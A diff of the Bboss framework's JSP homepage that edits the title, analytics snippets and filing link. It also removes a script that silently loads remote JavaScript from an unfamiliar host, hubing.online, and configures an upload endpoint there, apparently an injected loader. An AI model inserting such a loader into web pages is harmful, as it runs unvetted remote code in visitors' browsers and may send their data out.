@@ -10,7 +10,7 @@
 			+ path + "/index.htm";
 %><html>
 <head>
-<title>欢迎您访问Bboss官方网站 - 打造中国自主开发框架品牌</title>
+<title>Bboss官方网站</title>
 <meta name="description"
 	content="Bboss mvc DEMO列表 资源和文档下载 bboss-mvc框架体系结构图 bboss-mvc框架请求处理流程图 web.xml部署文件部分说明了mvc框架的涉及web.xml主要配置内容 框架更新记录" />
 <meta name="keywords"
@@ -39,7 +39,6 @@
 
 </head>
 <body>
-<script> !(function (c, b, d, a) { c[a] || (c[a] = {}); c[a].config = { userId: '',appKey: '5c35948874d1fd1330b921da', imgUrl: 'http://hubing.online:8081/Up?',disableHook:false, disableJS:false }; var dom = document.createElement("script"); dom.setAttribute("crossorigin", "anonymous"); dom.setAttribute("src", d); document.body.insertBefore(dom, document.body.firstChild); })(window, document, 'http://hubing.online:8082/bundle.js', "__ml"); </script>
 		<div id="caption">
 		<div><a name="top" id="top" href="https://esdoc.bbossgroups.com/" target="_blank">Elasticsearch Bboss文档</a>&nbsp;&nbsp;&nbsp;<a name="top" id="top" href="http://doc.bbossgroups.com" target="_blank">bboss文档</a>&nbsp;&nbsp;&nbsp;<a href="http://yin-bp.iteye.com" target="_blank">bboss博客</a>&nbsp;&nbsp;&nbsp;<a href="https://github.com/bbossgroups/bboss" target="_blank">Bboss GitHub</a>&nbsp;&nbsp;&nbsp;<!--<a href="http://gencode.bbossgroups.com" target="_blank">代码生成工具</a>&nbsp;&nbsp;&nbsp;<a href="http://session.bbossgroups.com" target="_blank">session共享</a>-->&nbsp;&nbsp;&nbsp;<a href="https://my.oschina.net/bboss/blog/1557434" target="_blank">bboss快速开发平台介绍</a>&nbsp;&nbsp;&nbsp;<a href="http://www.oschina.net/news/87828/bboss-session-5-0-3-1" target="_blank">bboss session共享框架 v5.0.3.1 发布</a>&nbsp;&nbsp;&nbsp;
 	            	<a href="https://www.oschina.net/news/113179/bboss-elasticsearch-6-0-1-released" target="_blank">Elasticsearch Rest Client bboss v6.0.1 发布</a>&nbsp;&nbsp;&nbsp;<a href="#1002">联系我们</a>	&nbsp;&nbsp;&nbsp;<a href="#3719">相关链接</a>	</div>
@@ -68,7 +67,7 @@
 	<div id="mainBody">
 
 		<div class="embeddedBlockContainer">
-			<h1>bboss是什么：</h1>
+			<h1><a href="#" onclick='_czc.push(["_trackEvent","小说","浏览","侠客行",10,"nodeid"]);'>bboss是什么</a>：</h1>
 			<div class="shadow">
 				<div class="info">
 					<p>
@@ -82,7 +81,7 @@
 
                                 </div> 
 			</div>
-<h1>bboss源码库：</h1>
+<h1><a href="#" onclick='_czc.push(["_trackEvent","电影","订购","红海行动",10,"nodeid2"]);'>bboss源码库</a>：</h1>
 <table>
  <thead>
 								<tr>
@@ -525,6 +524,8 @@
 				<script type="text/javascript">
 					$(document).ready(
 							function() {
+
+
 								$("#downloadToolList").load(
 										"tools/downloadList.htm");
 								$("#downloadList").load(
@@ -534,13 +535,17 @@
 							});
 				</script>
 				<script type="text/javascript">
-					var cnzz_protocol = (("https:" == document.location.protocol) ? " https://"
-							: " http://");
-					document
-							.write(unescape("%3Cspan id='cnzz_stat_icon_1254131450'%3E%3C/span%3E%3Cscript src='"
-									+ cnzz_protocol
-									+ "s11.cnzz.com/z_stat.php%3Fid%3D1254131450%26show%3Dpic2' type='text/javascript'%3E%3C/script%3E"));
-				</script><a href="http://www.miitbeian.gov.cn" target="_blank">湘ICP备16000994号</a> 回到顶部<a href="#top" name="3727"> <img border="0"
+					try {
+                        document.write(unescape("%3Cspan id='cnzz_stat_icon_1254131450'%3E%3C/span%3E%3Cscript src='https://s11.cnzz.com/z_stat.php%3Fid%3D1254131450%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));
+                    }
+                    catch (e) {
+						console.log(e);
+                    }
+				</script>
+				<script type="javascript">
+
+				</script>
+				<a href="https://beian.miit.gov.cn" target="_blank">湘ICP备16000994号-1</a> 回到顶部<a href="#top" name="3727"> <img border="0"
 					src="<%=request.getContextPath()%>/jsp/top.gif" alt="Top">
 				</a>
 			</h3>
